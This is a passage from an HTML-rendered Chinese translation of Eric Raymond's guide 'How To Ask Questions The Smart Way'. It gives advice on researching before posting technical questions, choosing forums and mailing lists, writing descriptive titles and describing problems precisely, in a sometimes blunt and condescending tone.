<li><p><a href="#%E6%B8%85%E6%A5%9A%E6%98%8E%E7%A1%AE%E7%9A%84%E8%A1%A8%E8%BE%BE%E4%BD%A0%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E9%9C%80%E6%B1%82"> 清楚明确的表达你的问题以及需求</a></p>
</li>
<li><p><a href="#%E8%AF%A2%E9%97%AE%E6%9C%89%E5%85%B3%E4%BB%A3%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98%E6%97%B6"> 询问有关代码的问题时</a></p>
</li>
<li><p><a href="#%E5%88%AB%E6%8A%8A%E8%87%AA%E5%B7%B1%E5%AE%B6%E5%BA%AD%E4%BD%9C%E4%B8%9A%E7%9A%84%E9%97%AE%E9%A2%98%E8%B4%B4%E4%B8%8A%E6%9D%A5"> 别把自己家庭作业的问题贴上来</a></p>
</li>
<li><p><a href="#%E5%8E%BB%E6%8E%89%E6%97%A0%E6%84%8F%E4%B9%89%E7%9A%84%E6%8F%90%E9%97%AE%E5%8F%A5"> 去掉无意义的提问句</a></p>
</li>
<li><p><a href="#%E5%8D%B3%E4%BD%BF%E4%BD%A0%E5%BE%88%E6%80%A5%E4%B9%9F%E4%B8%8D%E8%A6%81%E5%9C%A8%E6%A0%87%E9%A2%98%E5%86%99%E7%B4%A7%E6%80%A5"> 即使你很急也不要在标题写紧急</a></p>
</li>
<li><p><a href="#%E7%A4%BC%E5%A4%9A%E4%BA%BA%E4%B8%8D%E6%80%AA%EF%BC%8C%E8%80%8C%E4%B8%94%E6%9C%89%E6%97%B6%E8%BF%98%E5%BE%88%E6%9C%89%E5%B8%AE%E5%8A%A9"> 礼多人不怪，而且有时还很有帮助</a></p>
</li>
<li><p><a href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%90%8E%EF%BC%8C%E5%8A%A0%E4%B8%AA%E7%AE%80%E7%9F%AD%E7%9A%84%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"> 问题解决后，加个简短的补充说明</a></p>
</li>
</ul>
</li>
<li><p><a href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E8%AF%BB%E7%AD%94%E6%A1%88"> 如何解读答案</a></p>
<ul>
<li><p><a href="#RTFM%E5%92%8CSTFW%EF%BC%9A%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E4%BD%A0%E5%B7%B2%E5%AE%8C%E5%85%A8%E6%90%9E%E7%A0%B8%E4%BA%86"> RTFM和STFW：如何知道你已完全搞砸了</a></p>
</li>
<li><p><a href="#%E5%A6%82%E6%9E%9C%E8%BF%98%E6%98%AF%E6%90%9E%E4%B8%8D%E6%87%82"> 如果还是搞不懂</a></p>
</li>
<li><p><a href="#%E5%A4%84%E7%90%86%E6%97%A0%E7%A4%BC%E7%9A%84%E5%9B%9E%E5%BA%94"> 处理无礼的回应</a></p>
</li>
</ul>
</li>
<li><p><a href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%89%AE%E6%BC%94%E5%A4%B1%E8%B4%A5%E8%80%85"> 如何避免扮演失败者</a></p>
</li>
<li><p><a href="#%E4%B8%8D%E8%AF%A5%E9%97%AE%E7%9A%84%E9%97%AE%E9%A2%98"> 不该问的问题</a></p>
</li>
<li><p><a href="#%E5%A5%BD%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A0%A2%E9%97%AE%E9%A2%98"> 好问题与蠢问题</a></p>
</li>
<li><p><a href="#%E5%A6%82%E6%9E%9C%E5%BE%97%E4%B8%8D%E5%88%B0%E5%9B%9E%E7%AD%94"> 如果得不到回答</a></p>
</li>
<li><p><a href="#%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E5%9C%B0%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98"> 如何更好地回答问题</a></p>
</li>
<li><p><a href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90"> 相关资源</a></p>
</li>
<li><p><a href="#%E9%B8%A3%E8%B0%A2"> 鸣谢</a></p>
</li>
</ul>
<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>许多项目在他们的使用协助&#x2F;说明网页中链接了本指南，这么做很好，我们也鼓励大家都这么做。但如果你是负责管理这个项目网页的人，请在超链接附近的显着位置上注明：</p>
<p><strong>本指南不提供此项目的实际支持服务！</strong></p>
<p>我们已经深刻领教到少了上述声明所带来的痛苦。因为少了这点声明，我们不停地被一些白痴纠缠。这些白痴认为既然我们发布了这本指南，那么我们就有责任解决世上所有的技术问题。</p>
<p>如果你是因为需要某些协助而正在阅读这本指南，并且最后离开是因为发现从本指南作者们身上得不到直接的协助，那么你就是我们所说的那些白痴之一。别问我们问题，我们只会忽略你。我们在这本指南中是教你如何从那些真正懂得你所遇到软件或硬件问题的人取得协助，而99%的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在<a class="link"   href="http://www.catb.org/~esr/faqs/hacker-howto.html" >黑客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确的提问以获得你满意的答案。</p>
<p>不只是黑客，现在开放源代码（Open Source）软件已经相当盛行，你常常也可以由其他有经验的使用者身上得到好答案，这是件<em><strong>好事</strong></em> ；使用者比起黑客来，往往对那些新手常遇到的问题更宽容一些。然而，将有经验的使用者视为黑客，并采用本指南所提的方法与他们沟通，同样也是能从他们身上得到满意回答的最有效方式。</p>
<p>首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发我们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，”好问题！”是诚挚的大力称赞。</p>
<p>尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。</p>
<p>我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 -– 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 <code>失败者（撸瑟）</code> （由于历史原因，我们有时把它拼作 <code>lusers</code> ）。</p>
<p>我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们了解这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们回答问题的风格是指向那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就是在降低做自己最擅长的事情上的效率。</p>
<p>我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效的利用时间来回答<code>赢家（winner）</code>的问题。</p>
<p>如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 -</p>
<p>- 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。</p>
<p>所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 – 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。</p>
<p>如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 – 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。</p>
<p>（欢迎对本指南提出改进意见。你可以 email 你的建议至 <a class="link"   href="mailto:&#x65;&#x73;&#114;&#64;&#116;&#104;&#121;&#114;&#x73;&#117;&#x73;&#46;&#x63;&#111;&#x6d;" >&#x65;&#x73;&#114;&#64;&#116;&#104;&#121;&#114;&#x73;&#117;&#x73;&#46;&#x63;&#111;&#x6d;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 或<a class="link"   href="mailto:&#114;&#x65;&#x73;&#112;&#111;&#110;&#x64;&#45;&#97;&#x75;&#116;&#x6f;&#x40;&#x6c;&#105;&#x6e;&#117;&#x78;&#109;&#x61;&#x66;&#x69;&#x61;&#46;&#x63;&#111;&#x6d;" >&#114;&#x65;&#x73;&#112;&#111;&#110;&#x64;&#45;&#97;&#x75;&#116;&#x6f;&#x40;&#x6c;&#105;&#x6e;&#117;&#x78;&#109;&#x61;&#x66;&#x69;&#x61;&#46;&#x63;&#111;&#x6d;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。然而请注意，本文并非<a class="link"   href="http://www.ietf.org/rfc/rfc1855.txt" >网络礼节<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议。）</p>
<h2 id="在提问之前"><a href="#在提问之前" class="headerlink" title="在提问之前"></a>在提问之前</h2><p>在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：</p>
<ol>
<li><p>   尝试在你准备提问的论坛的旧文章中搜索答案。</p>
</li>
<li><p>   尝试上网搜索以找到答案。</p>
</li>
<li><p>   尝试阅读手册以找到答案。</p>
</li>
<li><p>   尝试阅读常见问题文件（FAQ）以找到答案。</p>
</li>
<li><p>   尝试自己检查或试验以找到答案</p>
</li>
<li><p>   向你身边的强者朋友打听以找到答案。</p>
</li>
<li><p>   如果你是程序开发者，请尝试阅读源代码以找到答案</p>
</li>
</ol>
<p>当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所学到的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。</p>
<p>运用某些策略，比如先用Google搜索你所遇到的各种错误信息（既搜索<a class="link"   href="http://groups.google.com/" >Google论坛<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，也搜索网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句<code>我在Google中搜过下列句子但没有找到什么有用的东西 </code>也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。</p>
<p>别着急，不要指望几秒钟的Google搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。</p>
<p>准备好你的问题，再将问题仔细的思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。</p>
<p>小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题… </code>， 一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。</p>
<p>绝不要自以为<em><strong>够格</strong></em>得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去<em><strong>挣到</strong></em>一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 –一个有潜力能贡献社区经验的问题，而不仅仅是被动的从他人处索取知识。</p>
<p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。 <code>谁能给点提示？</code> 、 <code>我的这个例子里缺了什么？</code> 以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p>
<h2 id="当你提问时"><a href="#当你提问时" class="headerlink" title="当你提问时"></a>当你提问时</h2><h3 id="慎选提问的论坛"><a href="#慎选提问的论坛" class="headerlink" title="慎选提问的论坛"></a>慎选提问的论坛</h3><p>小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：</p>
<ul>
<li><p>在与主题不合的论坛上贴出你的问题</p>
</li>
<li><p>在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然</p>
</li>
<li><p>在太多的不同新闻群组上重复转贴同样的问题（cross-post）</p>
</li>
<li><p>向既非熟人也没有义务解决你问题的人发送私人电邮</p>
</li>
</ul>
<p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发 生在自己身上的。</p>
<p>因此，第一步是找到对的论坛。再说一次，Google和其它搜索引擎还是你的朋友，用它们来找到与你遭 遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链 接。如果你的努力（包括<em><strong>阅读</strong></em>FAQ）都没有结果，网站上也许还有报告Bug（Bug-reporting）的流程或 链接，如果是这样，连过去看看。</p>
<p>向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作 者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 – 如果你不确定，那就向别 处发送，或者压根别发。</p>
<p>在选择论坛、新闻群组或邮件列表时，别太相信名字，先看看FAQ或者许可书以弄清楚你的问题是否切 题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表 的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮 助你归纳出更好的问题。</p>
<p>别像机关枪似的一次”扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。 </p>
<p>搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix或Windows操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之 前什么也别问。</p>
<p>一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有 几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助 到许多人的问题。</p>
<p>可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背 的稻草一样，你的加入也有可能使情况走向极端 – 已经好几次了，一些热门软件的作者从自己软件的支 持中抽身出来，因为伴随而来涌入其私人邮箱的无用邮件变得无法忍受。</p>
<h2 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h2><p>搜索，<em><strong>然后</strong></em> 在 Stack Exchange 问。</p>
<p>近年来，Stack Exchange community 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放 源码的项目。</p>
<p>因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的机率某人已经问了 一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没 有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。</p>
<p>Stack Exchange 已经成长到<a class="link"   href="http://stackexchange.com/sites" >超过一百个网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，以下是最常用的几个站：</p>
<ul>
<li><p>Super User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线 之类的，请到这里。 </p>
</li>
<li><p>Stack Overflow 是问写程序有关的问题。 </p>
</li>
<li><p>Server Fault 是问服务器和网管相关的问题。</p>
</li>
</ul>
<h2 id="网站和IRC论坛"><a href="#网站和IRC论坛" class="headerlink" title="网站和IRC论坛"></a>网站和IRC论坛</h2><p>本地的使用者群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表）， 这些地方是开始提问的 好首选，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。经过宣传的 IRC 频道是公开欢 迎提问的地方，通常可以即时得到回应。</p>
<p>事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的 论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复 “用<em><strong>我们的</strong></em>版本”。</p>
<p>在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许 这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引 擎有可能没来得及索引此论坛的全部内容。</p>
<p>通过论坛或 IRC 频道来提供使用者支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保 留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。</p>
<h2 id="第二步，使用项目邮件列表"><a href="#第二步，使用项目邮件列表" class="headerlink" title="第二步，使用项目邮件列表"></a>第二步，使用项目邮件列表</h2><p>当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答 你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用 这种办法：</p>
<ul>
<li><p>任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题 对整个项目群组来说太愚蠢，也不能成为骚扰个别开发者的理由。</p>
</li>
<li><p>向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。</p>
</li>
<li><p>大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。</p>
</li>
<li><p>如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。</p>
</li>
</ul>
<p>如果一个项目既有”使用者” 也有”开发者”（或”黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向”使用者”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。</p>
<p>然而，如果你<em><strong>确信</strong></em>你的问题很特别，而且在”使用者” 列表或论坛中几天都没有回复，可以试试前往”开发 者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任 何私有或半私有列表的好主意）</p>
<p>如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在 这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合 适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮 件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。</p>
<h2 id="使用有意义且描述明确的标题"><a href="#使用有意义且描述明确的标题" class="headerlink" title="使用有意义且描述明确的标题"></a>使用有意义且描述明确的标题</h2><p>在邮件列表、新闻群组或论坛中，大约50字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的<code>帮帮忙</code>、<code>跪求</code> 、<code>急</code> （更别说<code>救命啊！！！！</code>这样让人反感的话，用这种标题会被条件反射式地忽略） 来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而是在这点空间中使用极简单扼要的描述方式 来提出问题。</p>
<p>一个好标题范例是<code>目标 -- 差异</code>式的描述，许多技术支持组织就是这样做的。在<code>目标</code>部分指出是哪一个 或哪一组东西有问题，在<code>差异</code>部分则描述与期望的行为不一致的地方。</p>
<blockquote>
<p>蠢问题：救命啊！我的笔电不能正常显示了！ </p>
</blockquote>
<blockquote>
<p>聪明问题：X.org 6.8.1的鼠标游标会变形，某牌显卡 MV1005 芯片组。</p>
</blockquote>
<blockquote>
<p> 更聪明问题：X.org 6.8.1的鼠标游标，在某牌显卡 MV1005 芯片组环境下 - 会变形。</p>
</blockquote>
<p>编写<code>目标 -- 差异</code>式描述的过程有助于你组织对问题的细緻思考。是什么被影响了？ 仅仅是鼠标游标或 者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在6.8.1版中？ 是针对某牌显卡芯片组？或者只 是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境<em><strong>和</strong></em>你遇到的问题。</p>
<p>总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地 反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。</p>
<p>如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像<code>Re: 测试</code>或者<code>Re: 新bug</code>的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内 容，能给新来的读者留下线索。</p>
<p>对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程 序，比如 mutt ，允许使用者按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发 的消息。</p>
<p>仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定 讨论串。所以宁可发一个全新的邮件。</p>
<p>在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看 不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离 的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们 只会被正在查看该标题的人读到。所以，除非你<em><strong>只想</strong></em>在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。</p>
<h2 id="使问题容易回复"><a href="#使问题容易回复" class="headerlink" title="使问题容易回复"></a>使问题容易回复</h2><p>以<code>**请将你的回复寄到**……</code> 来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，<a class="link"   href="http://linuxmafia.com/faq/Mail/muas.html" >换个好点的<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>；如果是操作系统不支持这种邮件程序，也换个好点的。</p>
<p>在论坛，要求通过电子邮件回复是非常无礼的，除非你相信回复的信息可能比较敏感（而且有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如<code>追踪此讨论串</code>、<code>有回复时发送邮件提醒</code>等功能。</p>
<h2 id="用清晰、正确、精准并语法正确的语句"><a href="#用清晰、正确、精准并语法正确的语句" class="headerlink" title="用清晰、正确、精准并语法正确的语句"></a>用清晰、正确、精准并语法正确的语句</h2><p>我们从经验中发现，粗心的提问者通常也会粗心的写程序与思考（我敢打包票）。回答粗心大意者的问 题很不值得，我们宁愿把时间耗在别处。</p>
<p>正确的拼字、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那 我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 – 事实上， 黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它<em><strong>必须很</strong></em>准确，而且有迹象表明你是在思 考和关注问题。</p>
<p>正确地拼写、使用标点和大小写，不要将 <code>its</code> 混淆为 <code>it&#39;s </code>，<code>loose</code>搞成<code>lose</code>或者将 <code>discrete</code> 弄成 <code>discreet</code> 。不要<strong>全部用大写</strong>，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。<a class="link"   href="http://en.wikipedia.org/wiki/Alan_Cox" >Alan Cox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>也许可以这样做，但你不行。）</p>
<p>更白话的说，如果你写得像是个半文盲[译注：<a class="link"   href="http://zh.wikipedia.org/zh-tw/%E5%B0%8F%E7%99%BD" >小白<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>]），那多半得不到理睬。也不要使用即时通讯中的简写或<a class="link"   href="http://zh.wikipedia.org/zh-tw/%E7%81%AB%E6%98%9F%E6%96%87" >火星文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，如将<code>的</code> 简化为<code>ㄉ</code> 会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。</p>
<p>如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们 通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一 般会直接删除用他们看不懂语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚 未被阅读就被直接删除的可能性降到最低。</p>
<p>如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的： [译注：以下附上原文以供使用]</p>
<blockquote>
<p>English is not my native language; please excuse typing errors.</p>
</blockquote>
<ul>
<li>英文不是我的母语，请原谅我的错字或语法</li>
</ul>
<blockquote>
<p>If you speak $LANGUAGE, please email&#x2F;PM me; </p>
<p>I may need assistance translating my question.</p>
</blockquote>
<ul>
<li>如果你说<strong>某语言</strong>，请寄信&#x2F;私讯给我；我需要有人协助我翻译我的问题</li>
</ul>
<blockquote>
<p>I’ve posted my question in $LANGUAGE and English. </p>
<p>I’ll be glad to translate responses, if you only use one or the other.</p>
</blockquote>
<ul>
<li>我把我的问题用<strong>某语言</strong>和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。</li>
</ul>
<h2 id="使用易于读取且标准的文件格式发送问题"><a href="#使用易于读取且标准的文件格式发送问题" class="headerlink" title="使用易于读取且标准的文件格式发送问题"></a>使用易于读取且标准的文件格式发送问题</h2><p>如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：</p>
<ul>
<li><p>使用纯文字而不是HTML (<a class="link"   href="http://archive.birdhouse.org/etc/evilmail.html" >关闭HTML<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>并不难）</p>
</li>
<li><p>使用MIME附件通常是可以的，前提是真正有内容（譬如附带的源代码或patch），而不仅仅是邮件 程序生成的模板（譬如只是信件内容的拷贝）。 </p>
</li>
<li><p>不要发送一段文字只是单行句子但多次断行的邮件（这使得回复部分内容非常困难）。设想你的读 者是在80个字符宽的终端机上阅读邮件，最好设置你的断行点小于80字。 </p>
</li>
<li><p>但是，也<em><strong>不要</strong></em>用任何固定断行资料（譬如日志档案拷贝或会话记录）。档案应该原样包含，让回复 者有信心他们看到的是和你看到的一样的东西。 </p>
</li>
<li><p>在英语论坛中，不要使用 <code>Quoted-Printable</code> MIME编码发送消息。这种编码对于张贴非ASCII语言 可能是必须的，但很多邮件程序并不支持这种编码。当它们分断时，那些文本中四处散布的 <code>=20</code> 符 号既难看也分散注意力，甚至有可能破坏内容的语意。 </p>
</li>
<li><p>绝对，<em><strong>永远</strong></em>不要指望黑客们阅读使用封闭格式编写的文档，像是微软公司的Word或Excel文件等。 大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你门口阶梯上时你的反应一样。即便他们 能够处理，他们也很厌恶这么做。</p>
</li>
<li><p>如果你从使用Windows的电脑发送电子邮件，关闭微软愚蠢的 <code>智能引号</code> 功能 （从[选项] &gt; [校订] &gt; [自动校正选项], 按掉 <code>智能引号</code> 单选框），以免在你的邮件中到处散布垃圾字符。</p>
</li>
<li><p>在论坛，勿滥用 <code>表情符号</code> 和 <code>HTML</code> 功能（当它们提供时）。一两个表情符号通常没有问题，但花哨 的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻 笑的小姑娘。这通常不是个好主意，除非你只是对sex而不是有用的回复更有兴趣。</p>
</li>
</ul>
<p>如果你使用图形用户界面的邮件程序（如微软公司的Outlook或者其它类似的），注意它们的默认设置 不一定满足这些要求。大多数这类程序有基于选单的 <code>查看源代码</code> 命令，用它来检查发送文件夹中的消 息，以确保发送的是没有多餘杂质的纯文本文件。</p>
<h2 id="精确的描述问题并言之有物"><a href="#精确的描述问题并言之有物" class="headerlink" title="精确的描述问题并言之有物"></a>精确的描述问题并言之有物</h2><ul>
<li><p>仔细、清楚地描述你的问题或Bug的症状。</p>
</li>
<li><p>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版 和版本号（如： <code>Fedora Core 4</code> 、 <code>Slackware 9.1</code> 等）。</p>
</li>
<li><p>描述在提问前你是怎样去研究和理解这个问题的。</p>
</li>
<li><p>描述在提问前为确定问题而采取的诊断步骤。</p>
</li>
<li><p>描述最近做过什么可能相关的硬件或软件变更。 </p>
</li>
<li><p>尽可能的提供一个可以 <code>重现这个问题的既定环境</code> 的方法</p>
</li>
</ul>
<p>尽量去揣测一个黑客会怎样反问你，在他提问的时候预先给他答案。</p>
<p>以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重 要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。</p>
